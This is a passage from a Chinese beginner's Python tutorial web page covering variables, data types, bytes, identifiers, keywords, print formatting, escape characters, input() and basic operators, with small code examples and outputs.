pi也是一个变量</span></span><br></pre></td></tr></table></figure><p>变量的作用</p><p>一句话：可以存储数据</p><p>在程序中，有时我们需要对2个数据进行求和，那么该怎样做呢？类比生活中去超市买东西，往往需要一个菜篮子，用来进行存储物品，等到所有的物品都购买完成后，在收银台进行结账即可</p><p>如果在程序中需要把2个数据，或者多个数据进行求和的话，那么就需要把这些数据先存储起来，然后把它们累加起来即可</p><p>在Python中，存储一个数据，需要一个叫做<code>变量</code>的东西，如下示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = <span class="number">100</span></span><br><span class="line">num2 = <span class="number">200</span></span><br><span class="line">result = num1 + num2  <span class="comment"># 将变量num1中的值 加上 num2中的值再给result变量</span></span><br></pre></td></tr></table></figure><p>程序就是用来处理数据的，而变量就是用来存储数据的</p><h5 id="常量与变量的区别"><a href="#常量与变量的区别" class="headerlink" title="常量与变量的区别"></a>常量与变量的区别</h5><blockquote><p>在其他语言中有明确的常量和变量的概念，使用常量需要对之进行申明：    <code>const a = 10</code><br><strong>但在python中其实是不明确区分变量与常量的</strong>，具体看当前的这个值否可变</p></blockquote><p>常量：就是<strong>一个值</strong>，至于这个值是整数100，还是小数3.14甚至是其它的类型都行</p><p>变量：就是一个可以存储数据的空间</p><h3 id="6-数据类型"><a href="#6-数据类型" class="headerlink" title="6. 数据类型"></a>6. 数据类型</h3><h4 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h4><p>在数学中我们知道有整数、小数、复数等，简言之数据是有类型之分的</p><p>同样，在Python编程语言中，数据也是有类型的</p><h4 id="数据为什么要分类型"><a href="#数据为什么要分类型" class="headerlink" title="数据为什么要分类型"></a>数据为什么要分类型</h4><p>举个例子：从药店购买的眼药水与我们从商店购买的矿泉水，瓶子的大小为什么不一样大呢？</p><p>说到底不就是为了节省空间嘛，试想如果用矿泉水瓶来存储那么少的眼药水虽然是可以的，但会造成极大的浪费</p><p>因此，设计程序时要充分考虑既能存的下这个数据，而且还要尽可能小的内存空间，此时也就诞生了不同的数据类型</p><h4 id="数据类型的分类"><a href="#数据类型的分类" class="headerlink" title="数据类型的分类"></a>数据类型的分类</h4><p>为了更充分的利用内存空间以及更有效率的管理内存，数据是有不同的类型的</p><ul><li><p>Numbers(数字)</p><ul><li>int(有符号整型)</li><li>long(长整型[可以代表八进制与十六进制])</li><li>float(浮点型)</li><li>complex(复数)</li></ul></li><li><p>布尔类型</p><ul><li>True</li><li>False</li></ul></li><li><p>String(字符串)</p></li><li><p>List(列表)</p></li><li><p>Tuple(元组)</p></li><li><p>Dictionary(字典)</p></li><li><p>Set(集合)</p></li></ul><h4 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h4><p>怎样知道一个数据的类型呢？例如数字<code>100</code>是什么类型</p><p>在python中，只要有数据，那么一定有它的数据类型，可以使用<code>type(常量或者变量)</code>，来查看数据类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">100</span>))  <span class="comment"># 先用type检查100的类型，然后用print输出这个信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="number">3.14</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这说明:</p><ul><li>数值<code>100</code>的类型是<code>int</code>即整型</li><li>数值<code>3.14</code>的类型是<code>float</code>即浮点型</li><li>数值<code>&quot;hello world&quot;</code>的类型是<code>str</code>即字符串型</li></ul><h4 id="bytes类型及用法"><a href="#bytes类型及用法" class="headerlink" title="bytes类型及用法"></a>bytes类型及用法</h4><blockquote><p>bytes 是 Python 3.x 新增的类型，在 Python 2.x 中是不存在的。</p></blockquote><blockquote><p>python解释器没有字节类型，但是使用的时候会碰到：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">val= <span class="string">b&#x27;llalala&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(val))</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></blockquote><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>bytes 只负责以字节序列的形式（二进制形式）来存储数据，至于这些数据到底表示什么内容（字符串、数字、图片、音频等），完全由程序的解析方式决定。如果采用合适的字符编码方式（字符集），字节串可以恢复成字符串；反之亦然，字符串也可以转换成字节串。</p><p>说白了，bytes 只是简单地记录内存中的原始数据，至于如何使用这些数据，bytes 并不在意，你想怎么使用就怎么使用，bytes 并不约束你的行为。</p><p>bytes 类型的数据非常适合在互联网上传输，可以用于网络通信编程；bytes 也可以用来存储图片、音频、视频等二进制格式的文件。</p><p>字符串和 bytes 存在着千丝万缕的联系，我们可以通过字符串来创建 bytes 对象，或者说将字符串转换成 bytes 对象。有以下三种方法可以达到这个目的：</p><ul><li>如果字符串的内容都是 ASCII 字符，那么直接在字符串前面添加<code>b</code>前缀就可以转换成 bytes。</li><li>bytes 是一个类，调用它的构造方法，也就是 bytes()，可以将字符串按照指定的字符集转换成 bytes；如果不指定字符集，那么默认采用 UTF-8。</li><li>字符串本身有一个 encode() 方法，该方法专门用来将字符串按照指定的字符集转换成对应的字节串；如果不指定字符集，那么默认采用 UTF-8。</li></ul><h5 id="【实例】使用不同方式创建-bytes-对象："><a href="#【实例】使用不同方式创建-bytes-对象：" class="headerlink" title="【实例】使用不同方式创建 bytes 对象："></a>【实例】使用不同方式创建 bytes 对象：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过构造函数创建空 bytes</span></span><br><span class="line">b1 = <span class="built_in">bytes</span>()</span><br><span class="line"><span class="comment">#通过空字符串创建空 bytes</span></span><br><span class="line">b2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过b前缀将字符串转换成 bytes</span></span><br><span class="line">b3 = <span class="string">b&#x27;http://c.biancheng.net/python/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b3: &quot;</span>, b3)</span><br><span class="line"><span class="built_in">print</span>(b3[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(b3[<span class="number">7</span>:<span class="number">22</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#为 bytes() 方法指定字符集</span></span><br><span class="line">b4 = <span class="built_in">bytes</span>(<span class="string">&#x27;C语言中文网8岁了&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b4: &quot;</span>, b4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 encode() 方法将字符串转换成 bytes</span></span><br><span class="line">b5 = <span class="string">&quot;C语言中文网8岁了&quot;</span>.encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b5: &quot;</span>, b5)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#结果</span></span><br><span class="line">b3:  <span class="string">b&#x27;http://c.biancheng.net/python/&#x27;</span></span><br><span class="line"><span class="number">112</span></span><br><span class="line"><span class="string">b&#x27;c.biancheng.net&#x27;</span></span><br><span class="line">b4:  <span class="string">b&#x27;C\xe8\xaf\xad\xe8\xa8\x80\xe4\xb8\xad\xe6\x96\x87\xe7\xbd\x918\xe5\xb2\x81\xe4\xba\x86&#x27;</span></span><br><span class="line">b5:  <span class="string">b&#x27;C\xe8\xaf\xad\xe8\xa8\x80\xe4\xb8\xad\xe6\x96\x87\xe7\xbd\x918\xe5\xb2\x81\xe4\xba\x86&#x27;</span></span><br></pre></td></tr></table></figure><p>从运行结果可以发现，对于非 ASCII 字符，print 输出的是它的字符编码值（十六进制形式），而不是字符本身。非 ASCII 字符一般占用两个字节以上的内存，而 bytes 是按照单个字节来处理数据的，所以不能一次处理多个字节。</p><h5 id="字节串（bytes）和字符串（string）的对比："><a href="#字节串（bytes）和字符串（string）的对比：" class="headerlink" title="字节串（bytes）和字符串（string）的对比："></a>字节串（bytes）和字符串（string）的对比：</h5><ul><li>字符串由若干个字符组成，以字符为单位进行操作；字节串由若干个字节组成，以字节为单位进行操作。</li><li>字节串和字符串除了操作的数据单元不同之外，它们支持的所有方法都基本相同。</li><li>字节串和字符串都是不可变序列，不能随意增加和删除数据。</li></ul><h3 id="7-标识符与关键字"><a href="#7-标识符与关键字" class="headerlink" title="7. 标识符与关键字"></a>7. 标识符与关键字</h3><h5 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h5><p>什么是标识符？</p><ul><li>在程序中定义的一些符号和名称</li></ul><p>请看如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br></pre></td></tr></table></figure><p>在上述变量定义时，<code>age</code>就是变量的名字，实际上它就是标识符，如果在程序中需要获取<code>18</code>，那么就使用<code>age</code>这个标识符就可以了</p><p>因此，标识符到底有什么用？估计也有了答案</p><p>答：标识符是自己定义的符号，例如<strong>变量名 、函数名、类名</strong>等，可以快速找到我们用的数据或者功能</p><h5 id="标识符的规则"><a href="#标识符的规则" class="headerlink" title="标识符的规则"></a>标识符的规则</h5><p>标识符由<code>字母</code>、<code>下划线</code>和<code>数字</code>组成，且数字不能开头</p><p>思考：下面的标识符哪些是正确的，哪些不正确，为什么？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fromNo12</span><br><span class="line"><span class="keyword">from</span><span class="comment">#12</span></span><br><span class="line">my_Boolean</span><br><span class="line">my-Boolean</span><br><span class="line">Obj2</span><br><span class="line">2ndObj</span><br><span class="line">myInt</span><br><span class="line">test1</span><br><span class="line">Mike2jack</span><br><span class="line">My_tExt</span><br><span class="line">_test</span><br><span class="line">test!<span class="number">32</span></span><br><span class="line">haha(da)tt</span><br><span class="line"><span class="built_in">int</span></span><br><span class="line">jack_rose</span><br><span class="line">jack&amp;rose</span><br><span class="line">GUI</span><br><span class="line">G.U.I</span><br></pre></td></tr></table></figure><p><strong>Python中的标识符是区分大小写的！！！</strong></p><h5 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h5><ul><li><p>见名知意</p><p>  起一个有意义的名字，尽量做到看一眼就知道是什么意思(提高代码可 读性) 比如: 名字 就定义为 <code>name </code>, 定义学生 用<code> student</code></p></li><li><p>驼峰命名法</p><ol><li>小驼峰式命名法（lower camel case）： 第一个单词以小写字母开始；第二个单词的首字母大写，例如：<code>myName</code>、<code>aDog </code></li><li>大驼峰式命名法（upper camel case）： 每一个单词的首字母都采用大写字母，例如：<code>FirstName</code>、<code>LastName</code></li></ol></li><li><p>下划线命名法</p><p>  用<code>_</code>来连接所有的单词，比如<code>send_msg</code></p></li></ul><p><strong>注意</strong></p><ul><li>Python中变量名、函数名都使用<code>下划线命名法</code></li><li>Python中类名用<code>大驼峰命名法</code></li><li>全局变量用全部是大写，且单词之间用下划线链接的方式，例如<code>SUM_SCORE</code></li></ul><h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><p>什么是关键字？</p><p>上面的知识我们知道了什么是标识符，标识符分为2部分</p><ul><li>一部分是Python系统自己用了，用来实现某些特殊功能，像<code>if</code>，也就是<strong>关键字</strong></li><li>另外一部分是留给开发者自己用，像我们定义的年龄<code>age</code></li></ul><p>总结来说：Python<code>一些具有特殊功能的标识符</code>，这就是所谓的<code>关键字</code></p><p>注意：</p><ul><li><p>关键字，是python已经使用的了，所以不允许开发者自己定义和关键字相同的名字的标识符</p></li><li><p>如果将python内置的一个功能名称作为一个变量名去使用的话则会发生python内置的方法失效，也就是会覆盖掉原始python内置的关键字的用法，再次调用关键字的时候，会报错！</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例子：</span></span><br><span class="line"><span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>)</span><br><span class="line">str_number = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">int</span>(str_number)))</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209281742138.png" alt="image-20220928174218582" style="zoom:50%;" /></li></ul><h5 id="关键字有哪些？"><a href="#关键字有哪些？" class="headerlink" title="关键字有哪些？"></a>关键字有哪些？</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">True</span>, <span class="keyword">and</span>, <span class="keyword">as</span>, <span class="keyword">assert</span>, <span class="keyword">async</span>, <span class="keyword">await</span>, <span class="keyword">break</span>, <span class="keyword">class</span>, <span class="keyword">continue</span>, <span class="keyword">def</span>, <span class="keyword">del</span></span><br><span class="line"><span class="keyword">elif</span>, <span class="keyword">else</span>, <span class="keyword">except</span>, <span class="keyword">finally</span>, <span class="keyword">for</span>, <span class="keyword">from</span>, <span class="keyword">global</span>, <span class="keyword">if</span>, <span class="keyword">import</span>, <span class="keyword">in</span>, <span class="keyword">is</span>, <span class="keyword">lambda</span>, <span class="keyword">nonlocal</span></span><br><span class="line"><span class="keyword">not</span>, <span class="keyword">or</span>, <span class="keyword">pass</span>, <span class="keyword">raise</span>, <span class="keyword">return</span>, <span class="keyword">try</span>, <span class="keyword">while</span>, <span class="keyword">with</span>, <span class="keyword">yield</span></span><br></pre></td></tr></table></figure><p>可以在<code>Python交互模式</code>中通过以下命令进行查看关键字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> keyword</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.kwlist</span><br></pre></td></tr></table></figure><p>关键字的学习以及使用，咱们会在后面的课程中依一一进行学习。</p><h3 id="8-输出"><a href="#8-输出" class="headerlink" title="8. 输出"></a>8. 输出</h3><h5 id="print-的使用"><a href="#print-的使用" class="headerlink" title="print 的使用"></a>print 的使用</h5><blockquote><p>注意：</p><p>print输出后，一般以换行接下一个输出，（自动换行），如果需要输出的结尾不是<code>\n</code>，那么可以像这样指定输出末尾：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,<span class="number">1</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></blockquote><p>在Python中，如果我们需要打印出一些数据以便能够知道数据的大少，此时用<code>print</code>即可，会在终端中打印出对应的数据</p><h5 id="简单用法"><a href="#简单用法" class="headerlink" title="简单用法"></a>简单用法</h5><p>输出变量的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(变量名)  <span class="comment"># 直接将已经定义的变量名方到()中即可</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(age)</span><br></pre></td></tr></table></figure><p>输出常量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(常量)  <span class="comment"># 可以直接将常量放到()中</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>输出表达式的结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(表达式)  <span class="comment"># 直接将表达式放到()中</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span>+<span class="number">200</span>+<span class="number">300</span>)  <span class="comment"># 此时输出的是表达式计算的结果即600，而不是100+200+300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果就是想要输出100+200+300而不是600，可以将它们用双引号包裹起来，表位字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;100+200+300&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="进阶用法"><a href="#进阶用法" class="headerlink" title="进阶用法"></a>进阶用法</h5><p>如果想要一次性输出多个数据，可以用英文逗号<code>,</code>进行间隔</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>)  <span class="comment"># 此时会输出 100 200 300</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, <span class="number">200</span>, <span class="string">&quot;abc&quot;</span>)  <span class="comment"># 此时会输出 hello 200 abc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span>+<span class="number">200</span>+<span class="number">300</span>, <span class="number">500</span>)  <span class="comment"># 此时会输出 600 500</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line">b = <span class="number">200</span></span><br><span class="line">c = <span class="number">300</span></span><br><span class="line"><span class="built_in">print</span>(a, b, c)  <span class="comment"># 此时会输出100 200 300</span></span><br></pre></td></tr></table></figure><h5 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h5><p>格式化输出存在的意义是什么？</p><p>假如有以下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pirnt(<span class="string">&quot;我今年10岁&quot;</span>)</span><br><span class="line">pirnt(<span class="string">&quot;我今年11岁&quot;</span>)</span><br><span class="line">pirnt(<span class="string">&quot;我今年12岁&quot;</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>想一想：在输出年龄的时候，用了多次”我今年xx岁”，能否简化一下程序呢？？？</p><p>答：字符串格式化</p><p>什么是格式化输出？</p><p>看如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我今年%d岁&quot;</span> % age)</span><br><span class="line"></span><br><span class="line">age += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我今年%d岁&quot;</span> % age)</span><br><span class="line"></span><br><span class="line">age += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我今年%d岁&quot;</span> % age)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在程序中，<u>看到了<code>%</code>这样的操作符，这就是Python中格式化输出。</u></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">18</span></span><br><span class="line">name = <span class="string">&quot;顾安老师&quot;</span></span><br><span class="line">email = <span class="string">&quot;wt_poppies@sina.com&quot;</span>  <span class="comment"># 这是我的真实的邮箱地址，可以联系哦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的姓名是%s, 年龄是%d, 邮箱地址是%s&quot;</span> % (name, age, email))</span><br></pre></td></tr></table></figure><h5 id="常用的格式符号（占位符）"><a href="#常用的格式符号（占位符）" class="headerlink" title="常用的格式符号（占位符）"></a>常用的格式符号<strong>（占位符）</strong></h5><p>下面是完整的，它可以与<code>％</code>符号使用列表:</p><table><thead><tr><th align="left">格式符号</th><th align="left">转换</th></tr></thead><tbody><tr><td align="left"><code>%c</code></td><td align="left">字符</td></tr><tr><td align="left"><code>%s</code></td><td align="left">字符串</td></tr><tr><td align="left"><code>%d</code></td><td align="left">有符号十进制整数</td></tr><tr><td align="left"><code>%u</code></td><td align="left">无符号十进制整数</td></tr><tr><td align="left"><code>%o</code></td><td align="left">八进制整数</td></tr><tr><td align="left"><code>%x</code></td><td align="left">十六进制整数（小写字母<code>0x</code>）</td></tr><tr><td align="left"><code>%X</code></td><td align="left">十六进制整数（大写字母<code>0X</code>）</td></tr><tr><td align="left"><code>%f</code></td><td align="left">浮点数</td></tr><tr><td align="left"><code>%e</code></td><td align="left">科学计数法（小写<code>&#39;e&#39;</code>）</td></tr><tr><td align="left"><code>%E</code></td><td align="left">科学计数法（大写<code>“E”</code>）</td></tr><tr><td align="left"><code>%g</code></td><td align="left"><code>％f</code>和<code>％e </code>的简写</td></tr><tr><td align="left"><code>%G</code></td><td align="left"><code>％f</code>和<code>％E</code>的简写</td></tr></tbody></table><p>有这么多格式，用哪个好呢？</p><p>说实话，常用的也就是<code>%d</code>输出整数，<code>%f</code>输出浮点数，<code>%s</code>输出字符串，其他的用的很少</p><blockquote><p>除了这种格式化输出，还有两种其他格式化输出，现在直接总结一下三种格式化输出的方式：</p><blockquote><p><a href="https://blog.csdn.net/Joey9898/article/details/121940891">print(f‘‘)的用法</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;val = %d&quot;</span> % <span class="number">3</span>)</span><br><span class="line"><span class="comment"># 方法二，f是一个修饰符，在python3.6以上版本才可以使用</span></span><br><span class="line">val = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;val = <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 方法三</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;val = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3</span>))</span><br></pre></td></tr></table></figure></blockquote><h5 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h5><blockquote><p>Python 支持的转义字符</p></blockquote><table><thead><tr><th>转义字符</th><th>说明</th></tr></thead><tbody><tr><td>\n</td><td>换行符，将光标位置移到下一行开头。</td></tr><tr><td>\r</td><td>回车符，将光标位置移到本行开头。</td></tr><tr><td>\t</td><td>水平制表符，也即 Tab 键，一般相当于四个空格。</td></tr><tr><td>\a</td><td>蜂鸣器响铃。注意不是喇叭发声，现在的计算机很多都不带蜂鸣器了，所以响铃不一定有效。</td></tr><tr><td>\b</td><td>退格（Backspace），将光标位置移到前一列。</td></tr><tr><td>\</td><td>反斜线</td></tr><tr><td>&#39;</td><td>单引号</td></tr><tr><td>&quot;</td><td>双引号</td></tr><tr><td>\</td><td>在字符串行尾的续行符，即一行未完，转到下一行继续写。</td></tr></tbody></table><p>什么是转义字符？</p><p>运行如下代码，看看结果是什么：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;abcnABC&quot;</span>);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;abc\nABC&quot;</span>);</span><br></pre></td></tr></table></figure><p>输出结果是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abcnABC</span><br><span class="line">abc</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><p>仔细观察会发现，第2个打印中的字母n没有输出，而第1个的打印有字母n，为什么？</p><p>答：有些特殊的字母像n，如果在前面加上了一个反斜杠<code>\</code>，那么此时<code>\n</code>就有特殊功能了”换行“</p><p>除了<code>\n</code>表示换行以外，常用的还有<code>\t</code>表示一个tab键的间距。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;abc\tABC&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc    ABC</span><br></pre></td></tr></table></figure><h5 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h5><p>编写代码完成以下名片的显示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">==========我的名片==========</span><br><span class="line">姓名: 顾安老师</span><br><span class="line">email: wt_poppies@sina.com</span><br><span class="line">QQ:xxxxxxx</span><br><span class="line">手机号:172xxxxxx</span><br><span class="line">公司地址:湖南省长沙市xxxx</span><br><span class="line">===========================</span><br></pre></td></tr></table></figure><h3 id="9-输入"><a href="#9-输入" class="headerlink" title="9. 输入"></a>9. 输入</h3><h5 id="引入-3"><a href="#引入-3" class="headerlink" title="引入"></a>引入</h5><p>在银行ATM机器前取钱时，肯定需要输入密码，对不？那么怎样才能让程序知道咱们刚刚输入的是什么呢？？</p><p>大家应该知道了，如果要完成ATM机取钱这件事情，需要先从键盘中输入一个数据，然后用一个变量来保存，最后根据这个变量保存的值进行密码校验</p><h5 id="input-的使用"><a href="#input-的使用" class="headerlink" title="input 的使用"></a>input 的使用</h5><p>在Python中，获取键盘输入的数据的方法是采用 <code>input </code>函数（至于什么是函数，咱们以后的章节中讲解）</p><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;您刚刚输入的密码是:%s&#x27;</span> % password)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>:</p><ul><li><code>input()</code>的小括号中放入的是提示信息，用来在获取数据之前给用户的一个简单提示</li><li><code>input()</code>在从键盘获取了数据以后，会存放到等号左边的变量中</li><li><code>input()</code>会把用户输入的任何值都作为<strong>字符串</strong>来对待，如果需要输入的是其他类型，需要进行类型转换，比如用int()函数将字符串转化为int</li></ul><h5 id="获取多个数据"><a href="#获取多个数据" class="headerlink" title="获取多个数据"></a>获取多个数据</h5><p>如果一个程序需要获取多个数据，例如想要获取用户名以及密码，那么此时就要用2个<code>input</code></p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;您的用户名是：%s&quot;</span> % name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;您的密码是：%s&quot;</span> % password)</span><br></pre></td></tr></table></figure><h3 id="10-运算符"><a href="#10-运算符" class="headerlink" title="10. 运算符"></a>10. 运算符</h3><h5 id="什么是运算符"><a href="#什么是运算符" class="headerlink" title="什么是运算符"></a>什么是运算符</h5><p>所谓<code>运算符</code>，就是在Python编程语言中，能够<code>实现操作的符号</code>，像<code>+</code>能够实现加法，<code>-</code>能够实现减法</p><p>Python中的运算符有很多种，我们慢慢来学习</p><ul><li>算术运算符</li><li>赋值运算符</li><li>比较运算符</li><li>关系运算符</li><li>…..</li></ul><h5 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h5><p>下面以<code>a=10 ,b=20</code>为例进行计算</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left"><code>+</code></td><td align="left">加</td><td align="left">两个对象相加 <code>a + b</code> 输出结果<code> 30</code></td></tr><tr><td align="left"><code>-</code></td><td align="left">减</td><td align="left">得到负数或是一个数减去另一个数<code>   a - b</code>输出结果<code> -10</code></td></tr><tr><td align="left"><code>*</code></td><td align="left">乘</td><td align="left">两个数相乘或是返回一个被重复若干次的字符串 <code>a * b </code>输出结果<code> 200</code></td></tr><tr><td align="left"><code>/</code></td><td align="left">除</td><td align="left"><code>b / a</code> 输出结果<code> 2</code></td></tr><tr><td align="left"><code>//</code></td><td align="left">取整除</td><td align="left">返回商的整数部分 <code>9//2 </code>输出结果<code> 4</code> , <code>9.0//2.0 </code>输出结果<code> 4.0</code></td></tr><tr><td align="left"><code>%</code></td><td align="left">取余</td><td align="left">返回除法的余数 <code>b % a </code>输出结果<code> 0</code></td></tr><tr><td align="left"><code>**</code></td><td align="left">指数</td><td align="left"><code>2**3</code> 为<code>2</code>的<code>3</code>次方， 输出结果 <code>8</code></td></tr></tbody></table><p>注意：</p><ul><li>混合运算时，优先级顺序为： <code>**</code> 高于 <code>*</code> <code>/</code> <code>%</code> <code>//</code> 高于 <code>+</code> <code>-</code> ，为了避免歧义，建议使用 <code>()</code> 来处理运算符优先级。</li><li>不同类型的数字在进行混合运算时，整数将会转换成浮点数进行运算。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> + <span class="number">5.5</span> * <span class="number">2</span></span><br><span class="line"><span class="number">21.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> + (<span class="number">5.5</span> * <span class="number">2</span>)</span><br><span class="line"><span class="number">21.0</span></span><br></pre></td></tr></table></figure><h5 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h5><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left"><code>=</code></td><td align="left">赋值运算符</td><td align="left">把 <code> =</code> 号右边的结果 赋给 左边的变量，如 <code>num = 1 + 2 * 3</code>，结果<code>num</code>的值为<code>7</code></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单个变量赋值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num</span><br><span class="line"><span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span 